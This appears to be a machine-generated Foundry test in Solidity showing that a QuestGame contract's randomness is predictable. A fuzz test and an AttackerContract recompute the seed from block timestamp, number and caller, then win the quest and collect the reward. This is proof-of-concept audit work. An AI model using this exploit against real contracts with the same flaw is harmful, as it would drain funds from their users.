// Generation Time: 36,58s
// Input Tokens: 2262
// Output Tokens: 2338
// Reasoning Tokens: 998

// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public questGame;
    address public attacker;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        questGame = new QuestGame{value: 5 ether}();
        
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        vm.assume(blockTimestamp >= 1 hours && blockTimestamp < type(uint128).max);
        vm.assume(blockNumber > 0 && blockNumber < type(uint128).max);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        vm.deal(attacker, 1 ether);

        uint256 predictedSeed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    attacker
                )
            )
        );
        uint256 predictedNumber = predictedSeed % 100;

        uint256 attackerBalanceBefore = attacker.balance;

        vm.prank(attacker);
        questGame.attemptQuest{value: 0.1 ether}(predictedNumber);

        (uint256 exp, uint256 wins) = questGame.getPlayerStats(attacker);

        assertEq(wins, 1, "Attacker should have won by predicting the random number");
        assertEq(exp, 100, "Attacker should have gained 100 experience");
        assertEq(attacker.balance, attackerBalanceBefore - 0.1 ether + 0.2 ether, "Attacker should have received the reward");
    }
}

contract AttackerContract {
    QuestGame public target;

    constructor(address _target) {
        target = QuestGame(payable(_target));
    }

    function exploit() external {
        uint256 predictedSeed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    address(this)
                )
            )
        );
        uint256 predictedNumber = predictedSeed % 100;

        target.attemptQuest{value: 0.1 ether}(predictedNumber);
    }

    receive() external payable {}
}
